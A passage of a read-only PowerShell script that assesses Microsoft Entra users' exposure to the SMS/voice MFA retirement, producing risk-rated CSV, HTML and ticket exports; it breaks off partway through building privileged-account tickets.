#Requires -Version 7.0
<#
.SYNOPSIS
    Read-only assessment of users affected by Microsoft's Entra SMS/voice retirement and passkey migration.

.DESCRIPTION
    Correlates the Entra Authentication Methods Policy (AMP) scope for SMS and
    voice with the authentication-method registration report. It does not alter
    users, groups, policies, or authentication methods. Every Graph call is an
    HTTP GET.

    The report distinguishes policy targeting from actual method registration.
    This matters because a user can be targeted by policy but already have a
    passwordless method, or can have a phone-based method registered without
    appearing in the modern AMP scope (for example, via legacy per-user MFA).

    The registration campaign state is also reported, because Microsoft sets it
    to "Microsoft managed" for tenants in scope on September 1, 2026.

.PARAMETER TenantId
    Tenant GUID or verified domain. If omitted, the current Graph context is used,
    or an interactive sign-in is started without forcing a tenant. Always pass this
    when working across multiple tenants; it is what prevents the script from
    silently reusing a Graph session left over from a previous tenant.

.PARAMETER ClientId
    App registration (client) ID for unattended app-only authentication. Requires
    -CertificateThumbprint and -TenantId. Use this for multi-tenant sweeps.

.PARAMETER CertificateThumbprint
    Thumbprint of a certificate in the current user or local machine store, registered
    on the app registration. Client secrets are deliberately not supported.

.PARAMETER OutputPath
    CSV output path. Defaults to a timestamped file beside this script, or in the
    current directory when the script is run without a file path (dot-sourced or pasted).

.PARAMETER IncludeUnaffected
    Includes every enabled user in the CSV. By default, the CSV contains only
    migration candidates: users in SMS/voice policy scope or users with a
    phone-based authentication method registered.

.PARAMETER PassThru
    Emits the per-user assessment objects to the pipeline in addition to the summary.

.EXAMPLE
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId contoso.onmicrosoft.com

.EXAMPLE
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -IncludeUnaffected -OutputPath C:\Reports\Entra-Migration.csv -Verbose

.EXAMPLE
    # Unattended app-only run for a multi-tenant sweep
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId 00000000-0000-0000-0000-000000000000 `
        -ClientId 11111111-1111-1111-1111-111111111111 `
        -CertificateThumbprint A1B2C3D4E5F60718293A4B5C6D7E8F9012345678 `
        -OutputPath C:\SecureReports\contoso.csv

.NOTES
    Required delegated Microsoft Graph scopes (all read-only):
      Policy.Read.All, AuditLog.Read.All, User.Read.All, GroupMember.Read.All

    Recommended least-privileged Entra role for the signed-in operator:
      Global Reader or Security Reader

    Data source limitations:
      - userRegistrationDetails does not return disabled users. This script reads
        accountEnabled separately and assesses enabled users only.
      - The registration report has reporting latency. RegistrationReportLastUpdatedUtc
        is included per row so the age of the evidence is visible.
      - Entra does not store "SMS" and "voice" as separate registrations. It stores a
        phone number with a type, and the type determines capability. mobilePhone can
        serve both SMS and voice; officePhone is voice-only. There is no clean split.
      - Legacy per-user MFA service settings are not read. Users enabled for SMS/voice
        there are also in scope for the retirement. See docs/Microsoft-Migration-Background.md.

    References:
      https://learn.microsoft.com/entra/identity/authentication/concept-sms-voice-retirement
      https://learn.microsoft.com/graph/api/authenticationmethodsroot-list-userregistrationdetails
#>

[CmdletBinding(DefaultParameterSetName = 'Delegated')]
param(
    [Parameter(ParameterSetName = 'Delegated')]
    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [string]$TenantId,

    # App-only authentication. Certificate-based only; client secrets are deliberately
    # not supported, because a secret that can read tenant identity posture across 90+
    # customers is a credential that should not exist in a script parameter.
    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [ValidatePattern('^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$')]
    [string]$ClientId,

    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [ValidatePattern('^[0-9a-fA-F]{40}$')]
    [string]$CertificateThumbprint,

    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [string]$OutputPath = (Join-Path -Path $(if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }) -ChildPath "EntraSmsVoiceMigrationImpact_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"),

    [Parameter()]
    [switch]$IncludeUnaffected,

    # Produces a self-contained HTML report next to the CSV. No external assets, no CDN,
    # no JavaScript dependencies, so it survives being emailed or archived offline.
    [Parameter()]
    [switch]$HtmlReport,

    [Parameter()]
    [string]$CustomerName,

    # Writes a UPN-only CSV suitable for bulk-importing the migration security group that
    # Microsoft's guidance tells you to create as step one. Read-only: it produces a list,
    # it does not create or populate any group.
    [Parameter()]
    [switch]$ExportRemediationGroup,

    # Writes a PSA-importable ticket queue. Critical and High users get individual tickets;
    # everything else rolls into batch tickets, because 400 individual tickets is a backlog
    # nobody works, not a remediation plan.
    [Parameter()]
    [switch]$ExportTickets,

    [Parameter()]
    [ValidateRange(1, 500)]
    [int]$MaxIndividualTickets = 50,

    # Output files are restricted to the file owner and local Administrators by default.
    # Use this only where the filesystem rejects ACL changes and you control access another way.
    [Parameter()]
    [switch]$SkipAclHardening,

    [Parameter()]
    [switch]$PassThru
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# Graph endpoints are declared once so the read-only surface of this script is auditable at a glance.
$script:GraphBase = 'https://graph.microsoft.com/v1.0'

# Group display names are resolved once and reused; the same exclusion group is commonly
# referenced by both the SMS and voice method configurations.
$script:GroupNameCache = @{}

# Parameter-set detection is done once here rather than via $PSCmdlet, which is not
# addressable from inside the plain functions below.
$script:IsAppOnly = $PSBoundParameters.ContainsKey('CertificateThumbprint')

function Get-PropertyValue {
    # StrictMode Latest throws on missing properties. Graph omits properties rather than
    # returning nulls, so every read of a Graph payload goes through this accessor.
    param($Object, [Parameter(Mandatory)][string]$Name)

    if ($null -eq $Object) { return $null }
    $property = $Object.PSObject.Properties[$Name]
    if ($property) { return $property.Value }
    return $null
}

function Assert-GraphDependency {
    if (-not (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication)) {
        throw @'
Microsoft.Graph.Authentication is required but is not installed.
Install it for the current user with:
  Install-Module Microsoft.Graph.Authentication -Scope CurrentUser
'@
    }
    Import-Module Microsoft.Graph.Authentication -ErrorAction Stop
}

function Connect-AssessmentGraph {
    # Least-privilege read permissions only. Nothing here grants write access to any object.
    # Delegated: these are requested as scopes.
    # App-only: the same four must be granted as APPLICATION permissions on the app registration.
    $requiredScopes = @(
        'Policy.Read.All'
        'AuditLog.Read.All'
        'User.Read.All'
        'GroupMember.Read.All'
    )

    if ($script:IsAppOnly) {
        # Unattended path for multi-tenant sweeps. Always disconnects first: a reused context
        # is how one customer's identity posture ends up in another customer's evidence folder.
        Disconnect-MgGraph -ErrorAction SilentlyContinue | Out-Null
        Connect-MgGraph -TenantId $TenantId -ClientId $ClientId `
            -CertificateThumbprint $CertificateThumbprint -NoWelcome -ErrorAction Stop | Out-Null
    }
    else {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        $currentScopes = if ($context) { @(Get-PropertyValue $context 'Scopes') } else { @() }
        $hasScopes = $context -and (@($requiredScopes | Where-Object { $_ -notin $currentScopes }).Count -eq 0)

        # A stale session from a previous tenant is the most common cross-tenant reporting error,
        # so an explicit -TenantId must match the live context or a fresh sign-in is forced.
        $correctTenant = (-not $TenantId) -or ($context -and (($context.TenantId -eq $TenantId) -or ($context.Account -like "*@$TenantId")))

        if (-not ($hasScopes -and $correctTenant)) {
            $connect = @{ Scopes = $requiredScopes; NoWelcome = $true }
            if ($TenantId) { $connect.TenantId = $TenantId }
            Connect-MgGraph @connect | Out-Null
        }
    }

    $finalContext = Get-MgContext
    if (-not $finalContext) { throw 'Microsoft Graph connection was not established.' }

    $identity = if ($script:IsAppOnly) { "app $ClientId" } else { [string](Get-PropertyValue $finalContext 'Account') }

    # Hard guard against reporting the wrong customer. If an explicit -TenantId was supplied
    # and the established context does not match it, stop rather than write a mislabelled CSV.
    if ($TenantId -and $TenantId -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$' -and $finalContext.TenantId -ne $TenantId) {
        throw "Connected tenant $($finalContext.TenantId) does not match requested tenant $TenantId. Aborting to avoid a mislabelled report."
    }

    Write-Host "Connected tenant: $($finalContext.TenantId) as $identity" -ForegroundColor Cyan
    return $finalContext
}

function Invoke-GraphGet {
    # Single GET with bounded exponential backoff. Graph throttles report and directory
    # endpoints aggressively at multi-thousand-user scale; an unhandled 429 halfway through
    # pagination produces a silently incomplete assessment, which is worse than a slow one.
    param(
        [Parameter(Mandatory)][string]$Uri,
        [ValidateRange(1, 10)][int]$MaxAttempts = 5
    )

    $attempt = 0
    while ($true) {
        $attempt++
        try {
            return Invoke-MgGraphRequest -Method GET -Uri $Uri -OutputType PSObject -ErrorAction Stop
        }
        catch {
            $status = $null
            $responseProperty = $_.Exception.PSObject.Properties['Response']
            if ($responseProperty -and $responseProperty.Value) {
                $status = [int]$responseProperty.Value.StatusCode
            }

            # Only transient server-side conditions are retried. 401/403/404 fail fast.
            if ($attempt -ge $MaxAttempts -or $status -notin @(429, 503, 504)) { throw }

            $delaySeconds = [math]::Min(60, [math]::Pow(2, $attempt))
            Write-Verbose "Graph returned HTTP $status for $Uri. Retry $attempt of $MaxAttempts in $delaySeconds second(s)."
            Start-Sleep -Seconds $delaySeconds
        }
    }
}

function Get-GraphCollection {
    # Follows @odata.nextLink to completion. Partial pagination is treated as a hard failure
    # by Invoke-GraphGet rather than being swallowed into a short result set.
    param([Parameter(Mandatory)][string]$Uri)

    $items = [System.Collections.Generic.List[object]]::new()
    $next = $Uri
    while ($next) {
        $response = Invoke-GraphGet -Uri $next
        if ($response.PSObject.Properties.Name -contains 'value') {
            foreach ($item in @($response.value)) { $items.Add($item) }
            $next = Get-PropertyValue $response '@odata.nextLink'
        }
        else {
            $items.Add($response)
            $next = $null
        }
    }
    return $items.ToArray()
}

function Get-GroupDisplayName {
    # Raw GUIDs in a client deliverable are unreadable. Resolved once per group and cached,
    # because a tenant can reference the same exclusion group in both SMS and voice policies.
    # displayName is a basic group property, so GroupMember.Read.All already covers this.
    param([Parameter(Mandatory)][string]$GroupId)

    if ($script:GroupNameCache.ContainsKey($GroupId)) { return $script:GroupNameCache[$GroupId] }

    $name = $GroupId
    try {
        # Escaped even though Graph supplies this value; never build a URI from an
        # unescaped identifier, regardless of how trustworthy the source looks today.
        $group = Invoke-GraphGet -Uri "$($script:GraphBase)/groups/$([uri]::EscapeDataString($GroupId))?`$select=displayName"
        $displayName = [string](Get-PropertyValue $group 'displayName')
        if (-not [string]::IsNullOrWhiteSpace($displayName)) { $name = $displayName }
    }
    catch {
        # A deleted or inaccessible group must not fail the assessment; fall back to the GUID.
        Write-Verbose "Could not resolve display name for group $GroupId : $($_.Exception.Message)"
    }

    $script:GroupNameCache[$GroupId] = $name
    return $name
}

function Get-TargetId {
    param($Target)
    $id = Get-PropertyValue $Target 'id'
    if (-not $id) { $id = Get-PropertyValue $Target 'Id' }
    return [string]$id
}

function Get-TargetType {
    param($Target)
    $type = Get-PropertyValue $Target 'targetType'
    if (-not $type) { $type = Get-PropertyValue $Target 'TargetType' }
    return [string]$type
}

function Get-RegistrationCampaignState {
    # Microsoft flips this to "Microsoft managed" for in-scope tenants on 2026-09-01,
    # which is what triggers the end-user passkey nudge. Reported, never modified.
    $policy = Invoke-GraphGet -Uri "$script:GraphBase/policies/authenticationMethodsPolicy"
    $enforcement = Get-PropertyValue $policy 'registrationEnforcement'
    $campaign = Get-PropertyValue $enforcement 'authenticationMethodsRegistrationCampaign'
    $state = [string](Get-PropertyValue $campaign 'state')

    if ([string]::IsNullOrWhiteSpace($state)) { return 'unknown' }
    # Graph reports the Microsoft-managed default as 'default'; surface the portal wording.
    if ($state -eq 'default') { return 'default (Microsoft managed)' }
    return $state
}

function Get-MethodPolicyScope {
    # Resolves AMP include/exclude targets to a concrete user-id set. Exclusions are applied
    # after all inclusions because Entra evaluates exclude as an override, not an ordered filter.
    param(
        [Parameter(Mandatory)][ValidateSet('sms', 'voice')][string]$Method,
        [Parameter(Mandatory)][hashtable]$EnabledUserIndex
    )

    $config = Invoke-GraphGet -Uri "$script:GraphBase/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/$Method"
    $state = [string](Get-PropertyValue $config 'state')

    $result = [ordered]@{
        Method       = $Method
        State        = $state
        UserIds      = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
        IncludeNotes = [System.Collections.Generic.List[string]]::new()
        ExcludeNotes = [System.Collections.Generic.List[string]]::new()
    }

    # A disabled method has no effective scope, but registered methods are still assessed later.
    if ($state -ne 'enabled') { return [PSCustomObject]$result }

    $includeTargets = @((Get-PropertyValue $config 'includeTargets'))
    $excludeTargets = @((Get-PropertyValue $config 'excludeTargets'))

    foreach ($target in $includeTargets) {
        $type = Get-TargetType $target
        $id = Get-TargetId $target
        if (-not $id) { continue }

        if ($id -eq 'all_users') {
            foreach ($userId in $EnabledUserIndex.Keys) { [void]$result.UserIds.Add($userId) }
            $result.IncludeNotes.Add('All enabled users (members and guests)')
        }
        elseif ($type -eq 'user') {
            if ($EnabledUserIndex.ContainsKey($id)) { [void]$result.UserIds.Add($id) }
            $result.IncludeNotes.Add("User: $id")
        }
        elseif ($type -eq 'group') {
            # transitiveMembers is required: AMP group targeting honours nested membership.
            $members = Get-GraphCollection -Uri "$script:GraphBase/groups/$id/transitiveMembers/microsoft.graph.user?`$select=id&`$top=999"
            foreach ($member in $members) {
                $memberId = [string](Get-PropertyValue $member 'id')
                if ($EnabledUserIndex.ContainsKey($memberId)) { [void]$result.UserIds.Add($memberId) }
            }
            $result.IncludeNotes.Add("Group: $(Get-GroupDisplayName -GroupId $id) [$id] ($($members.Count) transitive user members)")
        }
    }

    foreach ($target in $excludeTargets) {
        $type = Get-TargetType $target
        $id = Get-TargetId $target
        if (-not $id) { continue }

        if ($type -eq 'user') {
            [void]$result.UserIds.Remove($id)
            $result.ExcludeNotes.Add("User: $id")
        }
        elseif ($type -eq 'group') {
            $members = Get-GraphCollection -Uri "$script:GraphBase/groups/$id/transitiveMembers/microsoft.graph.user?`$select=id&`$top=999"
            foreach ($member in $members) {
                [void]$result.UserIds.Remove([string](Get-PropertyValue $member 'id'))
            }
            $result.ExcludeNotes.Add("Group: $(Get-GroupDisplayName -GroupId $id) [$id] ($($members.Count) transitive user members)")
        }
    }

    return [PSCustomObject]$result
}

function Get-RiskAssessment {
    # Ordering is deliberate: the most specific and most damaging combination is evaluated first.
    # "Passwordless capable" is the mitigating control, since it is the only method class that
    # survives the February 1, 2027 retirement without a customer-managed telecom provider.
    param(
        [bool]$InPolicyScope,
        [bool]$HasPhoneMethodRegistered,
        [bool]$IsPasswordlessCapable,
        [bool]$IsAdmin,
        [string]$UserType
    )

    if ($InPolicyScope -and $HasPhoneMethodRegistered -and -not $IsPasswordlessCapable) {
        if ($IsAdmin) { return @('Critical', 'Privileged user is targeted, has a phone method registered, and is not passwordless-capable.') }
        if ($UserType -eq 'Guest') { return @('High', 'Guest is targeted, has a phone method registered, and lacks a reported passwordless method; validate B2B passkey readiness.') }
        return @('High', 'User is targeted, has a phone method registered, and is not passwordless-capable.')
    }
    if ($InPolicyScope -and -not $IsPasswordlessCapable) {
        return @('High', 'User is targeted by SMS/voice policy and is not passwordless-capable.')
    }
    if ($HasPhoneMethodRegistered -and -not $IsPasswordlessCapable) {
        return @('Moderate', 'Phone method is registered outside resolved modern policy scope; validate legacy per-user MFA exposure.')
    }
    if ($InPolicyScope -and $IsPasswordlessCapable) {
        return @('Low', 'User is targeted but already reports a policy-allowed passwordless method.')
    }
    if ($HasPhoneMethodRegistered -and $IsPasswordlessCapable) {
        return @('Low', 'Phone method remains registered, but user reports a policy-allowed passwordless method.')
    }
    return @('Informational', 'No resolved SMS/voice migration exposure.')
}

function ConvertTo-SafeHtml {
    # Directory display names are attacker-influenceable in some tenants (self-service
    # profile edits, B2B invite metadata). An unencoded display name containing markup
    # would execute in the browser of whoever opens the report, which for a client
    # deliverable means the person you emailed it to. Encode everything.
    param([AllowNull()][object]$Value)

    if ($null -eq $Value) { return '' }
    return [System.Net.WebUtility]::HtmlEncode([string]$Value)
}

function New-HtmlReport {
    param(
        [Parameter(Mandatory)]$Summary,
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
        [Parameter(Mandatory)][string]$Path,
        [string]$Customer
    )

    $now = Get-Date
    $autoEnableDate = [datetime]'2026-09-01'
    $retirementDate = [datetime]'2027-02-01'
    $daysToAutoEnable = [math]::Max(0, [int]($autoEnableDate - $now).TotalDays)
    $daysToRetirement = [math]::Max(0, [int]($retirementDate - $now).TotalDays)

    $title = if ($Customer) { "$Customer - Entra SMS/Voice Migration Impact" } else { 'Entra SMS/Voice Migration Impact' }

    # Only actionable rows go in the table. Low and Informational are in the CSV; putting
    # them here would bury the ten accounts that actually matter under four hundred that don't.
    $actionable = @($Rows | Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') })

    $tableRows = foreach ($row in $actionable) {
        $badgeClass = switch ($row.Risk) {
            'Critical' { 'b-crit' }
            'High'     { 'b-high' }
            'Moderate' { 'b-mod' }
            default    { 'b-low' }
        }
        $adminMark = if ($row.IsAdmin) { '<span class="admin">ADMIN</span>' } else { '' }
        $scope = @()
        if ($row.InSmsPolicyScope) { $scope += 'SMS' }
        if ($row.InVoicePolicyScope) { $scope += 'Voice' }
        $scopeText = if ($scope.Count -gt 0) { $scope -join ' + ' } else { 'not in AMP scope' }

        @"
<tr>
<td><span class="badge $badgeClass">$(ConvertTo-SafeHtml $row.Risk)</span></td>
<td class="name">$(ConvertTo-SafeHtml $row.DisplayName) $adminMark<br><span class="upn">$(ConvertTo-SafeHtml $row.UserPrincipalName)</span></td>
<td>$(ConvertTo-SafeHtml $row.UserType)</td>
<td>$(ConvertTo-SafeHtml $scopeText)</td>
<td>$(ConvertTo-SafeHtml $row.PhoneMethodsRegistered)</td>
<td class="$(if ($row.IsPasswordlessCapable) { 'yes' } else { 'no' })">$(if ($row.IsPasswordlessCapable) { 'Yes' } else { 'No' })</td>
<td class="reason">$(ConvertTo-SafeHtml $row.Reason)</td>
</tr>
"@
    }

    $emptyState = if ($actionable.Count -eq 0) {
        '<tr><td colspan="7" class="empty">No Critical, High, or Moderate findings. Verify against the portal and check legacy per-user MFA settings separately.</td></tr>'
    } else { '' }

    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- No scripts, no external requests. Defence in depth behind the HTML encoding:
     even if an encoding bug slipped through, nothing can execute or phone home. -->
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; form-action 'none'; base-uri 'none'">
<meta name="referrer" content="no-referrer">
<title>$(ConvertTo-SafeHtml $title)</title>
<style>
:root {
  --navy: #0E1B2C; --panel: #16273D; --line: #24384F;
  --accent: #22D99D; --text: #E8EEF5; --muted: #8FA3B8;
  --crit: #FF4D4D; --high: #FF8A3D; --mod: #FFC53D; --low: #22D99D;
}
* { box-sizing: border-box; }
body { margin: 0; background: var(--navy); color: var(--text);
  font: 15px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
.wrap { max-width: 1180px; margin: 0 auto; padding: 32px 20px 64px; }
h1 { font-size: 26px; margin: 0 0 4px; letter-spacing: -0.3px; }
h2 { font-size: 15px; text-transform: uppercase; letter-spacing: 1.4px;
  color: var(--accent); margin: 40px 0 14px; font-weight: 600; }
.sub { color: var(--muted); font-size: 13px; margin-bottom: 28px; }
.readonly { display: inline-block; border: 1px solid var(--accent); color: var(--accent);
  border-radius: 3px; padding: 2px 8px; font-size: 11px; letter-spacing: 1px; margin-left: 8px; }
.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; }
.card { background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 16px 18px; }
.card .n { font-size: 30px; font-weight: 700; line-height: 1.1; }
.card .l { font-size: 11px; text-transform: uppercase; letter-spacing: 1.2px; color: var(--muted); margin-top: 6px; }
.card.crit .n { color: var(--crit); } .card.high .n { color: var(--high); }
.card.mod .n { color: var(--mod); }  .card.low .n { color: var(--low); }
.clock { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 12px; }
.clock div { background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--accent);
  border-radius: 4px; padding: 12px 16px; flex: 1 1 260px; }
.clock .d { font-size: 22px; font-weight: 700; }
.clock .t { font-size: 12px; color: var(--muted); margin-top: 3px; }
table { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: 13.5px; }
th { text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
  color: var(--muted); border-bottom: 1px solid var(--line); padding: 10px 10px; font-weight: 600; }
td { border-bottom: 1px solid var(--line); padding: 12px 10px; vertical-align: top; }
tr:hover td { background: rgba(34,217,157,0.04); }
.badge { display: inline-block; border-radius: 3px; padding: 3px 9px; font-size: 11px;
  font-weight: 700; letter-spacing: 0.6px; color: var(--navy); }
.b-crit { background: var(--crit); color: #fff; } .b-high { background: var(--high); }
.b-mod { background: var(--mod); } .b-low { background: var(--low); }
.admin { background: var(--crit); color: #fff; font-size: 9.5px; font-weight: 700;
  padding: 2px 5px; border-radius: 2px; letter-spacing: 0.8px; vertical-align: middle; }
.name { font-weight: 600; } .upn { font-weight: 400; color: var(--muted); font-size: 12px; }
.reason { color: var(--muted); font-size: 12.5px; max-width: 300px; }
.yes { color: var(--accent); font-weight: 600; } .no { color: var(--crit); font-weight: 600; }
.empty { text-align: center; color: var(--muted); padding: 32px; }
dl { display: grid; grid-template-columns: 220px 1fr; gap: 8px 18px; margin: 0;
  background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 18px 20px; }
dt { color: var(--muted); font-size: 12.5px; } dd { margin: 0; font-size: 13.5px; word-break: break-word; }
.note { background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--mod);
  border-radius: 4px; padding: 16px 20px; font-size: 13px; color: var(--muted); }
.note ul { margin: 8px 0 0; padding-left: 18px; } .note li { margin-bottom: 6px; }
footer { margin-top: 44px; padding-top: 18px; border-top: 1px solid var(--line);
  color: var(--muted); font-size: 12px; }
@media print { body { background: #fff; color: #000; } .card, dl, .note, .clock div { border-color: #ccc; background: #fff; } }
</style>
</head>
<body>
<div class="wrap">

<h1>$(ConvertTo-SafeHtml $title)<span class="readonly">READ-ONLY</span></h1>
<div class="sub">
Tenant $(ConvertTo-SafeHtml $Summary.TenantId) &middot;
Assessed $(ConvertTo-SafeHtml $now.ToString('yyyy-MM-dd HH:mm')) local &middot;
$(ConvertTo-SafeHtml $Summary.EnabledUsersAssessed) enabled users evaluated &middot;
No tenant settings were changed
</div>

<div class="clock">
<div><div class="d">$daysToAutoEnable days</div><div class="t">Until 2026-09-01: users in SMS/voice scope auto-enabled for passkeys and nudged to register</div></div>
<div><div class="d">$daysToRetirement days</div><div class="t">Until 2027-02-01: Microsoft-provided SMS/voice delivery retired. No opt-out</div></div>
</div>

<h2>Exposure</h2>
<div class="grid">
<div class="card crit"><div class="n">$(ConvertTo-SafeHtml $Summary.Critical)</div><div class="l">Critical</div></div>
<div class="card high"><div class="n">$(ConvertTo-SafeHtml $Summary.High)</div><div class="l">High</div></div>
<div class="card mod"><div class="n">$(ConvertTo-SafeHtml $Summary.Moderate)</div><div class="l">Moderate</div></div>
<div class="card low"><div class="n">$(ConvertTo-SafeHtml $Summary.Low)</div><div class="l">Low</div></div>
<div class="card"><div class="n">$(ConvertTo-SafeHtml $Summary.MigrationCandidates)</div><div class="l">Migration candidates</div></div>
<div class="card"><div class="n">$(ConvertTo-SafeHtml $Summary.PasswordlessCapableInScope)</div><div class="l">Already passwordless</div></div>
</div>

<h2>Tenant configuration</h2>
<dl>
<dt>Registration campaign</dt><dd>$(ConvertTo-SafeHtml $Summary.RegistrationCampaignState)</dd>
<dt>SMS method state</dt><dd>$(ConvertTo-SafeHtml $Summary.SmsPolicyState)</dd>
<dt>SMS include targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.SmsPolicyInclude) { $Summary.SmsPolicyInclude } else { 'none' }))</dd>
<dt>SMS exclude targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.SmsPolicyExclude) { $Summary.SmsPolicyExclude } else { 'none' }))</dd>
<dt>Voice method state</dt><dd>$(ConvertTo-SafeHtml $Summary.VoicePolicyState)</dd>
<dt>Voice include targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.VoicePolicyInclude) { $Summary.VoicePolicyInclude } else { 'none' }))</dd>
<dt>Voice exclude targets</dt><dd>$(ConvertTo-SafeHtml $(if ($Summary.VoicePolicyExclude) { $Summary.VoicePolicyExclude } else { 'none' }))</dd>
<dt>Users in SMS scope</dt><dd>$(ConvertTo-SafeHtml $Summary.InSmsPolicyScope)</dd>
<dt>Users in voice scope</dt><dd>$(ConvertTo-SafeHtml $Summary.InVoicePolicyScope)</dd>
<dt>Oldest report row</dt><dd>$(ConvertTo-SafeHtml $Summary.OldestReportRowUtc) (registration report lags live directory state)</dd>
<dt>Users missing from report</dt><dd>$(ConvertTo-SafeHtml $Summary.UsersMissingFromReport)</dd>
</dl>

<h2>Actionable findings ($($actionable.Count))</h2>
<table>
<thead><tr>
<th>Risk</th><th>User</th><th>Type</th><th>AMP scope</th>
<th>Phone methods</th><th>Passwordless</th><th>Why</th>
</tr></thead>
<tbody>
$($tableRows -join "`n")$emptyState
</tbody>
</table>

<h2>Read this before acting</h2>
<div class="note">
<ul>
<li><strong>Critical rows are individual work.</strong> Privileged accounts that cannot satisfy MFA after retirement. Register a FIDO2 key or platform passkey and verify with a real test sign-in. Check emergency-access accounts specifically; they are the ones most likely to have a phone number attached that nobody has looked at in a year.</li>
<li><strong>A large Moderate count means legacy per-user MFA.</strong> Those users have a phone method registered but do not resolve into modern AMP scope. They are still in scope for the retirement. This assessment cannot read legacy per-user MFA service settings; validate that population manually.</li>
<li><strong>Policy scope is not effective sign-in behaviour.</strong> Conditional Access is not evaluated here. A user in AMP scope may never be challenged, and a user outside it may still be blocked by a grant control this assessment does not read.</li>
<li><strong>Disabled users are excluded</strong> because the registration report does not return them. Accounts re-enabled after this run are not represented.</li>
<li><strong>Guests follow a separate Microsoft timeline</strong> for passkey support. Validate B2B readiness independently before assuming a guest can register on the same schedule as a member.</li>
</ul>
</div>

<footer>
Generated by Get-EntraSmsVoiceMigrationImpact.ps1 &middot; Read-only assessment, no tenant settings modified &middot;
This report contains identity-security metadata including administrative status and registered authentication methods.
Handle and retain it with the same controls you apply to a penetration test report.
</footer>

</div>
</body>
</html>
"@

    $html | Out-File -LiteralPath $Path -Encoding utf8 -Force
    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
    return $Path
}

function New-TicketExport {
    # Generic PSA-shaped columns. ConnectWise, Autotask, Halo, and Freshservice all import
    # from a flat CSV; the column names differ per platform, so map them at import time
    # rather than baking one vendor's schema in here.
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
        [Parameter(Mandatory)][string]$Path,
        [string]$Customer,
        [int]$MaxIndividual = 50
    )

    $today = Get-Date
    $autoEnable = [datetime]'2026-09-01'
    $retirement = [datetime]'2027-02-01'

    # Work to the next deadline that has not passed. Before September the pressure is the
    # nudge and the chance to avoid it; after it, the pressure is the hard cutoff.
    $primaryDeadline = if ($today -lt $autoEnable) { $autoEnable } else { $retirement }
    $company = if ($Customer) { $Customer } else { 'Unassigned' }

    $criticalRows = @($Rows | Where-Object Risk -eq 'Critical' | Sort-Object DisplayName)
    $highRows = @($Rows | Where-Object Risk -eq 'High' | Sort-Object -Property @{ Expression = 'IsAdmin'; Descending = $true }, DisplayName)
    $moderateRows = @($Rows | Where-Object Risk -eq 'Moderate' | Sort-Object DisplayName)

    $tickets = [System.Collections.Generic.List[object]]::new()

    function New-Ticket {
        param($Priority, $Summary, $Description, $DueDate, $Category, $ContactName = '', $ContactEmail = '', $UserId = '', $Risk = '')
        return [PSCustomObject][ordered]@{
            Priority     = $Priority
            Summary      = $Summary
            Company      = $company
            ContactName  = $ContactName
            ContactEmail = $ContactEmail
            UserId       = $UserId
            Risk         = $Risk
            Category     = $Category
            DueDate      = $DueDate.ToString('yyyy-MM-dd')
            Status       = 'New'
            Source       = 'Entra SMS/Voice migration assessment'
            Description  = $Description
        }
    }

    # Critical: privileged accounts, individually, always. These are never batched.
    foreach ($row in $criticalRows) {
        $methods = if ($row.PhoneMethodsRegistered) { $row.PhoneMethodsRegistered } else { 'none reported' }
        $body = @"
PRIVILEGED ACCOUNT AT RISK OF SIGN-IN LOCKOUT

User: $($row.DisplayName) <$($row.UserPrincipalName)>
Object ID: $($row.UserId)
Registered phone methods: $methods
All registered methods: $($row.AllMethodsRegistered)
Passwordless capable: No

Why this ticket exists
This account holds a privileged role, is targeted by the Entra SMS/voice authentication
methods policy, and has no phishing-resistant method registered. When Microsoft-provided
SMS and voice delivery is retired on 2027-02-01 this account cannot satisfy MFA and will
be blocked at sign-in with no opt-out.

Actions
1. Contact the user and schedule a short session; do not rely on a self-service nudge for
   a privileged account.
2. Register a FIDO2 security key or platform passkey (Windows Hello, iOS, Android).
3. Verify with an actual test sign-in. Registration alone is not confirmation.
4. Confirm the account recovery path does not also depend on a phone number.
5. If this is an emergency-access or break-glass account, confirm the documented exclusion
   strategy still holds and that at least one break-glass account uses a method outside the
   retirement scope.
6. Leave the phone method registered until the passkey is verified working, then remove it.

Do not remove the phone method first. That creates the lockout you are trying to prevent.
"@
        $tickets.Add((New-Ticket -Priority 'P1 - Critical' `
            -Summary "Passkey migration (privileged): $($row.DisplayName)" `
            -Description $body -DueDate $primaryDeadline -Category 'Identity / MFA migration' `
            -ContactName $row.DisplayName -ContactEmail $row.UserPrincipalName `
